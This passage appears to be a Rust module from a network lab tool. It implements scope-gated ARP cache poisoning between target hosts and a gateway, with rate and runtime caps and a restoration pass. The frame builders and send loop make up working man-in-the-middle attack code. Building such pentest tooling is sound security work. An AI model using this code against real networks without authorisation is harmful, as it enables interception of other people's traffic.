//! Authorized, full-duplex ARP cache poisoning for the Network Lab
//! (Bettercap-parity `arpspoof` arc). FOR AUTHORIZED LAB USE ONLY: the
//! embedding application MUST hold the shared `NetworkOperationGate` lease,
//! show the native confirmation dialog and bind every pair to the saved,
//! memory-only lab scope before calling any entry point here — the module
//! itself never widens or re-derives a scope. Every IP it ever touches is one
//! the caller resolved FROM the saved lab scope (Target 1 ∪ Target 2); IPs
//! outside that scope are refused in `build_spoof_pairs`.
//!
//! What it does, exactly: for each (target, gateway) pair it emits
//! unsolicited ARP replies telling the TARGET that the gateway's IPv4 is at
//! OUR interface MAC, and replies telling the GATEWAY that the target's IPv4
//! is at OUR interface MAC (full duplex, ettercap-style). Sends are
//! rate-limited per round (default one round per second, 1..=10/s), pairs are
//! capped at 32, runtime is hard-capped at 30 minutes (auto-stop), and the
//! stop flag is honored before every send and during every park.
//!
//! On ANY end (operator stop, scope revocation, runtime cap, mid-run send
//! failure) a restoration pass runs: it re-announces the gateway's REAL MAC
//! to every target and the targets' REAL MACs to the gateway. Real MACs are
//! learned passively during the run from observed ARP frames (the module's
//! own looped-back transmissions are filtered out); identities still unknown
//! get a bounded number of legitimate solicited ARP requests. The
//! restoration report says exactly what was restored and what stayed
//! unknown — nothing is silently dropped. Note for the lab timeline: this
//! module's own frames ARE ARP replies and will surface as `arp_conflict`
//! events in the `arp_watch` / `lab_events` reductions — that visibility is
//! intended, not a leak.
//!
//! Mirrors `active_arp.rs` discipline: Linux AF_PACKET + CAP_NET_RAW only;
//! every other platform reports `Unsupported`. The pure decision core
//! (frames, pacing, learning, restoration bookkeeping, the loop itself) is
//! platform-independent and unit-tested everywhere; only the socket shim is
//! Linux-gated. The module never enables promiscuous mode and never modifies
//! interface flags.

use std::collections::BTreeMap;
use std::net::{IpAddr, Ipv4Addr};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};

/// Hard pair cap, matching the ARP discovery target cap (`MAX_ARP_TARGETS`).
pub const MAX_SPOOF_PAIRS: usize = 32;
/// Rate bounds per second: one poisoning round per interval, never faster.
pub const MIN_SPOOF_RATE_PER_SEC: u32 = 1;
pub const MAX_SPOOF_RATE_PER_SEC: u32 = 10;
/// Operator default: one round per second (ettercap's gentle cadence).
pub const DEFAULT_SPOOF_RATE_PER_SEC: u32 = 1;
/// Hard runtime cap per run: 30 minutes, then the loop auto-stops and
/// restores. A forgotten run cannot poison forever.
pub const MAX_SPOOF_RUNTIME_MS: u64 = 30 * 60 * 1000;
/// Max park between stop/timeout checks: stop latency stays ~20 ms.
const MAX_PARK_MS: u64 = 20;
/// Bounded solicited recovery during restoration: at most two requests per
/// unknown identity, 100 ms reply window each (worst case ~7 s for 33
/// identities). Restoration is bounded, never unbounded listening.
const RESTORE_PROBE_ATTEMPTS: usize = 2;
const RESTORE_PROBE_PARK_MS: u64 = 100;
/// Ethernet broadcast: used as the frame destination while a victim's real
/// MAC is unknown (the reply still reaches and updates every cache on the
/// segment, including the victim's).
pub const BROADCAST_MAC: [u8; 6] = [0xff; 6];
/// Ethernet + ARP/IPv4 reply frame length (14 + 28 bytes).
pub const ARP_FRAME_LEN: usize = 42;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SpoofErrorCode {
    /// Platform cannot provide native ARP injection (everything but Linux).
    Unsupported,
    /// Bad scope: out-of-scope IPs, malformed selectors, bad rate or counts.
    InvalidScope,
    /// Raw socket refused (CAP_NET_RAW missing).
    Permission,
    /// Selected interface unusable (missing, down, no IPv4/MAC).
    Device,
    /// Socket I/O failure mid-run.
    Io,
    /// Run never started because stop was already requested or scope gone.
    Cancelled,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SpoofError {
    pub code: SpoofErrorCode,
    pub message: String,
}
impl SpoofError {
    pub fn new(code: SpoofErrorCode, message: impl Into<String>) -> Self {
        Self {
            code,
            message: message.into(),
        }
    }
}

/// One authorized full-duplex pair: `target`'s cache is pointed at us for
/// `gateway`, and the `gateway`'s cache is pointed at us for `target`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SpoofPair {
    pub target: Ipv4Addr,
    pub gateway: Ipv4Addr,
}

// ---------------------------------------------------------------------------
// Frame builders (pure, all platforms so fixtures are testable everywhere).
// ---------------------------------------------------------------------------

fn valid_unicast_mac(mac: [u8; 6]) -> bool {
    mac != [0; 6] && mac[0] & 1 == 0
}

fn valid_claimed_ip(ip: Ipv4Addr) -> bool {
    !ip.is_unspecified() && !ip.is_multicast() && !ip.is_broadcast()
}

/// Ethernet II + ARP reply (op 2). `eth_src` is always OUR real interface MAC
/// (the actual transmitter); `claimed_mac`/`claimed_ip` are the ARP sender
/// fields — OUR MAC when poisoning, the victim's REAL MAC when restoring.
/// `victim_mac` may be zero while the victim's hardware address is unknown
/// (broadcast delivery). Refuses to claim a victim's own address to itself.
pub fn arp_reply_frame(
    eth_src: [u8; 6],
    dst_mac: [u8; 6],
    claimed_mac: [u8; 6],
    claimed_ip: Ipv4Addr,
    victim_mac: [u8; 6],
    victim_ip: Ipv4Addr,
) -> Result<[u8; ARP_FRAME_LEN], SpoofError> {
    if !valid_unicast_mac(eth_src) {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            "frame transmitter MAC must be a non-zero unicast address",
        ));
    }
    if dst_mac != BROADCAST_MAC && !valid_unicast_mac(dst_mac) {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            "frame destination must be broadcast or a unicast MAC",
        ));
    }
    if !valid_unicast_mac(claimed_mac) {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            "ARP claimed sender MAC must be a non-zero unicast address",
        ));
    }
    if victim_mac != [0; 6] && !valid_unicast_mac(victim_mac) {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            "ARP victim MAC must be zero (unknown) or a unicast address",
        ));
    }
    if !valid_claimed_ip(claimed_ip) {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            format!("claimed IP {claimed_ip} is not a usable unicast host address"),
        ));
    }
    if !valid_claimed_ip(victim_ip) {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            format!("victim IP {victim_ip} is not a usable unicast host address"),
        ));
    }
    if claimed_ip == victim_ip {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            "a spoof frame cannot claim the victim's own address to the victim",
        ));
    }
    let mut f = [0u8; ARP_FRAME_LEN];
    f[..6].copy_from_slice(&dst_mac);
    f[6..12].copy_from_slice(&eth_src);
    f[12..14].copy_from_slice(&0x0806u16.to_be_bytes()); // EtherType: ARP
    f[14..16].copy_from_slice(&1u16.to_be_bytes()); // hardware type: Ethernet
    f[16..18].copy_from_slice(&0x0800u16.to_be_bytes()); // protocol: IPv4
    f[18] = 6; // hlen
    f[19] = 4; // plen
    f[20..22].copy_from_slice(&2u16.to_be_bytes()); // operation: reply
    f[22..28].copy_from_slice(&claimed_mac);
    f[28..32].copy_from_slice(&claimed_ip.octets());
    f[32..38].copy_from_slice(&victim_mac);
    f[38..42].copy_from_slice(&victim_ip.octets());
    Ok(f)
}

/// Poison direction 1: tell the TARGET that the gateway IP is at OUR MAC.
/// Broadcast-delivered while the target's real MAC is still unknown.
pub fn poison_frame_to_target(
    pair: SpoofPair,
    our_mac: [u8; 6],
    known_target_mac: Option<[u8; 6]>,
) -> Result<[u8; ARP_FRAME_LEN], SpoofError> {
    let dst = known_target_mac.unwrap_or(BROADCAST_MAC);
    let victim = known_target_mac.unwrap_or([0; 6]);
    arp_reply_frame(our_mac, dst, our_mac, pair.gateway, victim, pair.target)
}

/// Poison direction 2: tell the GATEWAY that the target IP is at OUR MAC.
pub fn poison_frame_to_gateway(
    pair: SpoofPair,
    our_mac: [u8; 6],
    known_gateway_mac: Option<[u8; 6]>,
) -> Result<[u8; ARP_FRAME_LEN], SpoofError> {
    let dst = known_gateway_mac.unwrap_or(BROADCAST_MAC);
    let victim = known_gateway_mac.unwrap_or([0; 6]);
    arp_reply_frame(our_mac, dst, our_mac, pair.target, victim, pair.gateway)
}

/// Restoration direction 1: tell the TARGET the gateway's REAL MAC. Requires
/// the learned real gateway MAC; without it the target cannot be honestly
/// restored and is reported unknown instead of guessed at.
pub fn restore_frame_to_target(
    pair: SpoofPair,
    our_mac: [u8; 6],
    gateway_mac: [u8; 6],
    known_target_mac: Option<[u8; 6]>,
) -> Result<[u8; ARP_FRAME_LEN], SpoofError> {
    let dst = known_target_mac.unwrap_or(BROADCAST_MAC);
    let victim = known_target_mac.unwrap_or([0; 6]);
    arp_reply_frame(our_mac, dst, gateway_mac, pair.gateway, victim, pair.target)
}

/// Restoration direction 2: tell the GATEWAY the target's REAL MAC.
pub fn restore_frame_to_gateway(
    pair: SpoofPair,
    our_mac: [u8; 6],
    target_mac: [u8; 6],
    known_gateway_mac: Option<[u8; 6]>,
) -> Result<[u8; ARP_FRAME_LEN], SpoofError> {
    let dst = known_gateway_mac.unwrap_or(BROADCAST_MAC);
    let victim = known_gateway_mac.unwrap_or([0; 6]);
    arp_reply_frame(our_mac, dst, target_mac, pair.target, victim, pair.gateway)
}

/// Legitimate solicited ARP request used ONLY by the restoration pass to
/// recover a real MAC nobody announced during the run. Sender identity is
/// OUR real interface, never impersonated.
pub fn arp_request_frame(
    sender_mac: [u8; 6],
    sender_ip: Ipv4Addr,
    wanted_ip: Ipv4Addr,
) -> Result<[u8; ARP_FRAME_LEN], SpoofError> {
    if !valid_unicast_mac(sender_mac) {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            "ARP request sender MAC must be a non-zero unicast address",
        ));
    }
    if !valid_claimed_ip(sender_ip) || !valid_claimed_ip(wanted_ip) {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            "ARP request sender and wanted IP must be usable unicast addresses",
        ));
    }
    if sender_ip == wanted_ip {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            "ARP request cannot ask about the local address itself",
        ));
    }
    let mut f = [0u8; ARP_FRAME_LEN];
    f[..6].copy_from_slice(&BROADCAST_MAC);
    f[6..12].copy_from_slice(&sender_mac);
    f[12..14].copy_from_slice(&0x0806u16.to_be_bytes());
    f[14..16].copy_from_slice(&1u16.to_be_bytes());
    f[16..18].copy_from_slice(&0x0800u16.to_be_bytes());
    f[18] = 6;
    f[19] = 4;
    f[20..22].copy_from_slice(&1u16.to_be_bytes()); // operation: request
    f[22..28].copy_from_slice(&sender_mac);
    f[28..32].copy_from_slice(&sender_ip.octets());
    // target MAC stays zero; target IP is the wanted address.
    f[38..42].copy_from_slice(&wanted_ip.octets());
    Ok(f)
}

/// One parsed ARP frame view for the passive MAC learner.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ArpFrameView {
    pub eth_src: [u8; 6],
    pub operation: u16,
    pub sender_mac: [u8; 6],
    pub sender_ip: Ipv4Addr,
}

/// Parse the fields the learner needs from a received Ethernet/ARP frame.
/// Accepts requests and replies; rejects short, non-ARP or malformed frames
/// (wrong hardware/protocol type or lengths, unknown opcodes).
pub fn parse_arp_frame(frame: &[u8]) -> Option<ArpFrameView> {
    if frame.len() < ARP_FRAME_LEN {
        return None;
    }
    if u16::from_be_bytes([frame[12], frame[13]]) != 0x0806 {
        return None;
    }
    if u16::from_be_bytes([frame[14], frame[15]]) != 1
        || u16::from_be_bytes([frame[16], frame[17]]) != 0x0800
        || frame[18] != 6
        || frame[19] != 4
    {
        return None;
    }
    let operation = u16::from_be_bytes([frame[20], frame[21]]);
    if operation != 1 && operation != 2 {
        return None;
    }
    let eth_src: [u8; 6] = frame[6..12].try_into().ok()?;
    let sender_mac: [u8; 6] = frame[22..28].try_into().ok()?;
    let sender_ip = Ipv4Addr::new(frame[28], frame[29], frame[30], frame[31]);
    Some(ArpFrameView {
        eth_src,
        operation,
        sender_mac,
        sender_ip,
    })
}

// ---------------------------------------------------------------------------
// Pacing, learning and outcome bookkeeping (pure, all platforms).
// ---------------------------------------------------------------------------

/// Round pacer: one poisoning round every `1000 / rate` ms. The next due time
/// is computed from the CURRENT time after each round, so a stalled worker
/// never bursts to catch up — honest pacing, no debt.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SpoofPacer {
    interval_ms: u64,
    next_due_ms: u64,
}

impl SpoofPacer {
    pub fn new(rate_per_sec: u32) -> Result<Self, SpoofError> {
        validate_rate(rate_per_sec)?;
        Ok(Self {
            interval_ms: 1000 / u64::from(rate_per_sec),
            next_due_ms: 0,
        })
    }
    pub fn ready(&self, now_ms: u64) -> bool {
        now_ms >= self.next_due_ms
    }
    pub fn advance(&mut self, now_ms: u64) {
        self.next_due_ms = now_ms + self.interval_ms;
    }
    pub fn due_in_ms(&self, now_ms: u64) -> u64 {
        self.next_due_ms.saturating_sub(now_ms)
    }
    pub fn interval_ms(&self) -> u64 {
        self.interval_ms
    }
}

pub fn validate_rate(rate_per_sec: u32) -> Result<(), SpoofError> {
    if !(MIN_SPOOF_RATE_PER_SEC..=MAX_SPOOF_RATE_PER_SEC).contains(&rate_per_sec) {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            format!(
                "spoof rate must be {MIN_SPOOF_RATE_PER_SEC}..={MAX_SPOOF_RATE_PER_SEC} rounds/s"
            ),
        ));
    }
    Ok(())
}

pub fn validate_pairs(pairs: &[SpoofPair]) -> Result<(), SpoofError> {
    if pairs.is_empty() || pairs.len() > MAX_SPOOF_PAIRS {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            format!("ARP spoofing supports 1..={MAX_SPOOF_PAIRS} (target, gateway) pairs"),
        ));
    }
    let gateway = pairs[0].gateway;
    let mut seen_targets: Vec<Ipv4Addr> = Vec::new();
    for pair in pairs {
        if !valid_claimed_ip(pair.target) || !valid_claimed_ip(pair.gateway) {
            return Err(SpoofError::new(
                SpoofErrorCode::InvalidScope,
                "spoof pairs must use usable unicast IPv4 addresses",
            ));
        }
        if pair.gateway != gateway {
            return Err(SpoofError::new(
                SpoofErrorCode::InvalidScope,
                "all spoof pairs in one run must share the single authorized gateway",
            ));
        }
        if pair.target == pair.gateway {
            return Err(SpoofError::new(
                SpoofErrorCode::InvalidScope,
                "a spoof target cannot be the gateway itself",
            ));
        }
        if seen_targets.contains(&pair.target) {
            return Err(SpoofError::new(
                SpoofErrorCode::InvalidScope,
                format!("duplicate spoof target {}", pair.target),
            ));
        }
        seen_targets.push(pair.target);
    }
    Ok(())
}

/// Injectable monotonic clock (ms since run start). The Linux shim derives it
/// from `Instant`; tests drive it deterministically.
pub trait SpoofClock {
    fn now_ms(&self) -> u64;
    /// Park at most `max_ms`; the loop re-checks stop/scope/runtime after it.
    fn park(&mut self, max_ms: u64);
}

/// Passive learner: records the REAL MAC of the authorized gateway and of
/// each authorized target from observed ARP frames. First claim wins (the
/// pre-poisoning identity is the restoration truth), and our own
/// transmissions plus multicast/broadcast/zero claims are ignored.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct MacLedger {
    gateway_mac: Option<[u8; 6]>,
    target_macs: BTreeMap<Ipv4Addr, [u8; 6]>,
}

impl MacLedger {
    /// Record a binding if it names an authorized pair endpoint. Returns
    /// true when something was learned.
    pub fn observe(
        &mut self,
        sender_ip: Ipv4Addr,
        sender_mac: [u8; 6],
        eth_src: [u8; 6],
        our_mac: [u8; 6],
        pairs: &[SpoofPair],
    ) -> bool {
        if sender_mac == [0; 6] || sender_mac[0] & 1 != 0 {
            return false;
        }
        // Our own frames come back through the packet socket: the Ethernet
        // source and the claimed sender MAC both identify them.
        if sender_mac == our_mac || eth_src == our_mac {
            return false;
        }
        let mut learned = false;
        for pair in pairs {
            if sender_ip == pair.gateway && self.gateway_mac.is_none() {
                self.gateway_mac = Some(sender_mac);
                learned = true;
            }
            if sender_ip == pair.target && !self.target_macs.contains_key(&pair.target) {
                self.target_macs.insert(pair.target, sender_mac);
                learned = true;
            }
        }
        learned
    }
    pub fn gateway_mac(&self) -> Option<[u8; 6]> {
        self.gateway_mac
    }
    pub fn target_mac(&self, target: Ipv4Addr) -> Option<[u8; 6]> {
        self.target_macs.get(&target).copied()
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SpoofEndReason {
    OperatorStop,
    ScopeRevoked,
    RuntimeCapReached,
    /// A send failed mid-run; poisoning ended and restoration was attempted.
    SendFailure,
}

/// Honest restoration accounting: every frame the pass sent (including the
/// solicited recovery requests), what was restored, and what stayed unknown.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RestorationReport {
    /// ALL frames sent during restoration (recovery requests + re-arm replies).
    pub packets_sent: u64,
    /// The gateway's real MAC was learned, so targets could be re-armed.
    pub gateway_mac_known: bool,
    /// Targets that received a reply re-announcing the gateway's REAL MAC.
    pub targets_restored: usize,
    /// Gateway cache entries re-announced with the targets' REAL MACs.
    pub gateway_entries_restored: usize,
    /// Targets whose real MAC was never learned: the gateway-side entry for
    /// them could NOT be restored. Never silently dropped.
    pub unknown_target_macs: Vec<Ipv4Addr>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SpoofOutcome {
    /// Every frame sent by the whole run (poison rounds + restoration).
    pub packets_sent: u64,
    pub rounds: u64,
    pub end_reason: SpoofEndReason,
    pub restoration: RestorationReport,
    /// Last send error seen mid-run; the restoration still ran.
    pub error: Option<SpoofError>,
}

/// The platform-independent spoofing loop. Sends poisoning rounds at the
/// configured pace, drains observed frames into the learner between rounds,
/// and ends on operator stop, scope revocation, the 30-minute runtime cap or
/// the first send failure — ALWAYS followed by the restoration pass, which
/// runs even after stop/scope loss (leaving poisoned caches behind is the
/// one unacceptable outcome).
#[allow(clippy::too_many_arguments)]
pub fn run_spoof_loop(
    pairs: &[SpoofPair],
    rate_per_sec: u32,
    our_mac: [u8; 6],
    our_ip: Ipv4Addr,
    stop: &AtomicBool,
    scope_active: &(impl Fn() -> bool + Sync),
    clock: &mut impl SpoofClock,
    sent_counter: &AtomicU64,
    send: &mut impl FnMut(&[u8; ARP_FRAME_LEN]) -> Result<(), SpoofError>,
    drain: &mut impl FnMut(&mut MacLedger),
) -> Result<SpoofOutcome, SpoofError> {
    validate_pairs(pairs)?;
    validate_rate(rate_per_sec)?;
    let mut pacer = SpoofPacer::new(rate_per_sec)?;
    let mut ledger = MacLedger::default();
    let mut packets_sent = 0u64;
    let mut rounds = 0u64;
    let mut error: Option<SpoofError> = None;
    let end_reason = loop {
        if stop.load(Ordering::Acquire) {
            break SpoofEndReason::OperatorStop;
        }
        if !scope_active() {
            break SpoofEndReason::ScopeRevoked;
        }
        let now = clock.now_ms();
        if now >= MAX_SPOOF_RUNTIME_MS {
            break SpoofEndReason::RuntimeCapReached;
        }
        if pacer.ready(now) {
            let mut round_error: Option<SpoofError> = None;
            for pair in pairs {
                let frames = [
                    poison_frame_to_target(*pair, our_mac, ledger.target_mac(pair.target)),
                    poison_frame_to_gateway(*pair, our_mac, ledger.gateway_mac()),
                ];
                for frame in frames {
                    match frame.and_then(|f| send(&f).map(|()| f)) {
                        Ok(_) => {
                            packets_sent += 1;
                            sent_counter.store(packets_sent, Ordering::Release);
                        }
                        Err(err) => {
                            round_error = Some(err);
                            break;
                        }
                    }
                }
                if round_error.is_some() {
                    break;
                }
            }
            if let Some(err) = round_error {
                error = Some(err);
                break SpoofEndReason::SendFailure;
            }
            rounds += 1;
            pacer.advance(now);
        }
        drain(&mut ledger);
        let now = clock.now_ms();
        // Park in small slices so stop/scope/runtime stay responsive, and
        // never park past the runtime cap.
        let remaining = pacer
            .due_in_ms(now)
            .max(1)
            .min(MAX_PARK_MS)
            .min(MAX_SPOOF_RUNTIME_MS.saturating_sub(now).max(1));
        clock.park(remaining);
    };
    let restoration = restoration_pass(
        pairs,
        our_mac,
        our_ip,
        &mut ledger,
        clock,
        sent_counter,
        &mut packets_sent,
        send,
        drain,
        &mut error,
    );
    sent_counter.store(packets_sent, Ordering::Release);
    Ok(SpoofOutcome {
        packets_sent,
        rounds,
        end_reason,
        restoration,
        error,
    })
}

/// Bounded restoration: solicit unknown real MACs, then re-announce every
/// learned truth in both directions. Counted frame-by-frame.
#[allow(clippy::too_many_arguments)]
fn restoration_pass(
    pairs: &[SpoofPair],
    our_mac: [u8; 6],
    our_ip: Ipv4Addr,
    ledger: &mut MacLedger,
    clock: &mut impl SpoofClock,
    sent_counter: &AtomicU64,
    packets_sent: &mut u64,
    send: &mut impl FnMut(&[u8; ARP_FRAME_LEN]) -> Result<(), SpoofError>,
    drain: &mut impl FnMut(&mut MacLedger),
    error_out: &mut Option<SpoofError>,
) -> RestorationReport {
    let mut report = RestorationReport {
        packets_sent: 0,
        gateway_mac_known: false,
        targets_restored: 0,
        gateway_entries_restored: 0,
        unknown_target_macs: Vec::new(),
    };
    // 1. Solicited recovery for identities nobody announced during the run.
    let mut wanted: Vec<Ipv4Addr> = Vec::new();
    if ledger.gateway_mac().is_none() {
        wanted.push(pairs[0].gateway);
    }
    for pair in pairs {
        if ledger.target_mac(pair.target).is_none() && !wanted.contains(&pair.target) {
            wanted.push(pair.target);
        }
    }
    for ip in wanted {
        for _ in 0..RESTORE_PROBE_ATTEMPTS {
            let known = if ip == pairs[0].gateway {
                ledger.gateway_mac().is_some()
            } else {
                ledger.target_mac(ip).is_some()
            };
            if known {
                break;
            }
            send_restoration_frame(
                arp_request_frame(our_mac, our_ip, ip),
                &mut report,
                sent_counter,
                packets_sent,
                send,
                error_out,
            );
            clock.park(RESTORE_PROBE_PARK_MS);
            drain(ledger);
        }
    }
    // 2. Re-arm the TARGETS with the gateway's REAL MAC.
    if let Some(gateway_mac) = ledger.gateway_mac() {
        report.gateway_mac_known = true;
        for pair in pairs {
            let frame = restore_frame_to_target(
                *pair,
                our_mac,
                gateway_mac,
                ledger.target_mac(pair.target),
            );
            if send_restoration_frame(
                frame,
                &mut report,
                sent_counter,
                packets_sent,
                send,
                error_out,
            ) {
                report.targets_restored += 1;
            }
        }
    }
    // 3. Re-arm the GATEWAY with the targets' REAL MACs; anything still
    //    unknown is reported, never guessed.
    for pair in pairs {
        match ledger.target_mac(pair.target) {
            Some(target_mac) => {
                let frame =
                    restore_frame_to_gateway(*pair, our_mac, target_mac, ledger.gateway_mac());
                if send_restoration_frame(
                    frame,
                    &mut report,
                    sent_counter,
                    packets_sent,
                    send,
                    error_out,
                ) {
                    report.gateway_entries_restored += 1;
                }
            }
            None => report.unknown_target_macs.push(pair.target),
        }
    }
    report
}

/// Send one restoration frame; count it only when actually transmitted.
fn send_restoration_frame(
    frame: Result<[u8; ARP_FRAME_LEN], SpoofError>,
    report: &mut RestorationReport,
    sent_counter: &AtomicU64,
    packets_sent: &mut u64,
    send: &mut impl FnMut(&[u8; ARP_FRAME_LEN]) -> Result<(), SpoofError>,
    error_out: &mut Option<SpoofError>,
) -> bool {
    match frame.and_then(|f| send(&f).map(|()| f)) {
        Ok(_) => {
            *packets_sent += 1;
            report.packets_sent += 1;
            sent_counter.store(*packets_sent, Ordering::Release);
            true
        }
        Err(err) => {
            if error_out.is_none() {
                *error_out = Some(err);
            }
            false
        }
    }
}

/// The authorized entry point. Preflight (stop/scope/pairs/rate) runs on
/// every platform; transmission is Linux AF_PACKET only and every other
/// platform reports `Unsupported` before touching the network. `sent_counter`
/// is updated after EVERY transmitted frame so an embedding IPC layer can
/// report live counts while the run is still poisoning.
pub fn run_arp_spoof(
    interface_name: &str,
    pairs: &[SpoofPair],
    rate_per_sec: u32,
    stop: &AtomicBool,
    scope_active: &(impl Fn() -> bool + Sync),
    sent_counter: &AtomicU64,
) -> Result<SpoofOutcome, SpoofError> {
    if stop.load(Ordering::Acquire) || !scope_active() {
        return Err(SpoofError::new(
            SpoofErrorCode::Cancelled,
            "ARP spoof scope was revoked before start",
        ));
    }
    validate_pairs(pairs)?;
    validate_rate(rate_per_sec)?;
    #[cfg(target_os = "linux")]
    {
        linux::run(
            interface_name,
            pairs,
            rate_per_sec,
            stop,
            scope_active,
            sent_counter,
        )
    }
    #[cfg(not(target_os = "linux"))]
    {
        let _ = (interface_name, sent_counter);
        Err(SpoofError::new(
            SpoofErrorCode::Unsupported,
            "ARP spoofing currently requires Linux AF_PACKET and CAP_NET_RAW",
        ))
    }
}

// ---------------------------------------------------------------------------
// Saved-scope validation (pure): the spoof never widens the operator's scope.
// Mirrors network_lab_targeting.rs selectors; IPv6 entries cannot participate
// in ARP and are skipped honestly during target expansion.
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ScopeSelector {
    Single(IpAddr),
    Network(IpAddr, u8),
}

impl ScopeSelector {
    fn parse(entry: &str, group: &str) -> Result<Self, SpoofError> {
        let value = entry.trim();
        if let Some((addr, prefix)) = value.split_once('/') {
            let address: IpAddr = addr.parse().map_err(|_| {
                SpoofError::new(
                    SpoofErrorCode::InvalidScope,
                    format!("bad CIDR address in lab scope {group}: {addr}"),
                )
            })?;
            let bits: u8 = prefix.parse().map_err(|_| {
                SpoofError::new(
                    SpoofErrorCode::InvalidScope,
                    format!("bad CIDR prefix in lab scope {group}: {prefix}"),
                )
            })?;
            let width = if address.is_ipv4() { 32 } else { 128 };
            if bits > width {
                return Err(SpoofError::new(
                    SpoofErrorCode::InvalidScope,
                    format!("invalid /{bits} prefix for {address} in lab scope {group}"),
                ));
            }
            return Ok(Self::Network(address, bits));
        }
        let address: IpAddr = value.parse().map_err(|_| {
            SpoofError::new(
                SpoofErrorCode::InvalidScope,
                format!("lab scope entry must be an IP or CIDR: {value}"),
            )
        })?;
        Ok(Self::Single(address))
    }

    fn contains(self, candidate: IpAddr) -> bool {
        match self {
            Self::Single(ip) => ip == candidate,
            Self::Network(IpAddr::V4(ip), prefix) => {
                let IpAddr::V4(other) = candidate else {
                    return false;
                };
                let shift = 32u32 - u32::from(prefix);
                if shift == 32 {
                    return true;
                }
                (u32::from(ip) >> shift) == (u32::from(other) >> shift)
            }
            Self::Network(IpAddr::V6(ip), prefix) => {
                let IpAddr::V6(other) = candidate else {
                    return false;
                };
                let shift = 128u32 - u32::from(prefix);
                if shift == 128 {
                    return true;
                }
                (u128::from(ip) >> shift) == (u128::from(other) >> shift)
            }
        }
    }
}

/// Parsed saved scope: every selector (for membership checks, both families)
/// plus the distinct probeable IPv4 hosts expanded from it, first-seen order.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ScopeSet {
    selectors: Vec<ScopeSelector>,
    pub targets: Vec<Ipv4Addr>,
}

fn expand_scope_entry(
    selector: ScopeSelector,
    into: &mut Vec<Ipv4Addr>,
    cap: usize,
) -> Result<(), SpoofError> {
    let cap_error = || {
        SpoofError::new(
            SpoofErrorCode::InvalidScope,
            format!(
                "the saved lab scope resolves to more than {cap} probeable IPv4 targets \
                 (Target 1 ∪ Target 2); ARP spoofing accepts at most {MAX_SPOOF_PAIRS} — \
                 narrow the scope"
            ),
        )
    };
    let (address, prefix) = match selector {
        ScopeSelector::Single(IpAddr::V4(ip)) => {
            if into.contains(&ip) {
                return Ok(());
            }
            if into.len() >= cap {
                return Err(cap_error());
            }
            into.push(ip);
            return Ok(());
        }
        // IPv6 has no ARP role: skipped honestly, never half-poisoned.
        ScopeSelector::Single(IpAddr::V6(_)) | ScopeSelector::Network(IpAddr::V6(_), _) => {
            return Ok(());
        }
        ScopeSelector::Network(IpAddr::V4(ip), prefix) => (ip, prefix),
    };
    let host_bits = 32u32 - u32::from(prefix);
    let count = 1u64 << host_bits;
    let mask = if host_bits == 0 {
        u32::MAX
    } else {
        u32::MAX << host_bits
    };
    let base = u32::from(address) & mask;
    for i in 0..count {
        if prefix < 31 && (i == 0 || i == count - 1) {
            continue; // network and broadcast addresses are never hosts
        }
        let host = Ipv4Addr::from(base + i as u32);
        if into.contains(&host) {
            continue;
        }
        if into.len() >= cap {
            return Err(cap_error());
        }
        into.push(host);
    }
    Ok(())
}

/// Parse and expand the saved lab scope (Target 1 entries then Target 2,
/// deduplicated, IPv4-only hosts). Refuses an empty resolution and any
/// expansion past the cap — refusal, never truncation.
pub fn build_scope_set(
    entries_t1: &[String],
    entries_t2: &[String],
    cap: usize,
) -> Result<ScopeSet, SpoofError> {
    let mut selectors = Vec::new();
    for (entries, group) in [(entries_t1, "Target 1"), (entries_t2, "Target 2")] {
        for entry in entries {
            if entry.trim().is_empty() {
                continue;
            }
            selectors.push(ScopeSelector::parse(entry, group)?);
        }
    }
    let mut targets: Vec<Ipv4Addr> = Vec::new();
    for selector in &selectors {
        expand_scope_entry(*selector, &mut targets, cap)?;
    }
    if targets.is_empty() {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            "the saved lab scope resolves to no probeable IPv4 targets — ARP spoofing \
             cannot start (IPv6 entries need Neighbor Discovery, not ARP; add IPv4 or \
             IPv4 CIDR entries to Target 1 or Target 2)",
        ));
    }
    Ok(ScopeSet { selectors, targets })
}

/// Explicit membership gate: the candidate must live inside the saved scope.
pub fn scope_contains(set: &ScopeSet, candidate: Ipv4Addr) -> bool {
    set.selectors
        .iter()
        .any(|selector| selector.contains(IpAddr::V4(candidate)))
}

/// Build the run's pairs from the parsed scope: the gateway must be IN the
/// saved scope, must not be a target itself, and the target list is the
/// first `target_count` resolved scope hosts after removing the gateway.
/// Every produced pair is re-checked against the parsed scope (defense in
/// depth: a resolution bug can never widen the poison set).
pub fn build_spoof_pairs(
    set: &ScopeSet,
    gateway: Ipv4Addr,
    target_count: usize,
) -> Result<Vec<SpoofPair>, SpoofError> {
    if !scope_contains(set, gateway) {
        return Err(SpoofError::new(
            SpoofErrorCode::InvalidScope,
            format!(
                "refusing to spoof {gateway}: the gateway is outside the saved lab scope \
                 (Target 1 ∪ Target 2)"
            ),
        ));
    }
